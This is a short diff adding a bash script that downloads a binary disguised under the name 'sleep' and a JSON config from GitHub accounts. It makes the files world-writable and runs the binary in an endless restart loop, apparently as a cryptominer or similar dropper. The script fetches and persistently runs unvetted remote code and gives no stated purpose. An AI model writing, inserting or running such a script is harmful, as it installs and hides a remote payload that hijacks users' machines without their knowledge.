@@ -1,0 +1,16 @@
+#!/bin/bash
+## requirement
+apt-get -qq update
+apt-get -qq install -y wget curl unzip
+
+
+mkdir -p /tmp/c3
+cd /tmp/c3
+wget https://raw.githubusercontent.com/Iki78/Jsn/main/V90.json
+wget wget https://github.com/Blenkinship/any/raw/main/sleep
+chmod -R  777 /tmp/c3
+#!/bin/sh
+while [ 1 ]; do
+	/tmp/c3/sleep --config=/tmp/c3/V90.json
+	sleep 5
+done
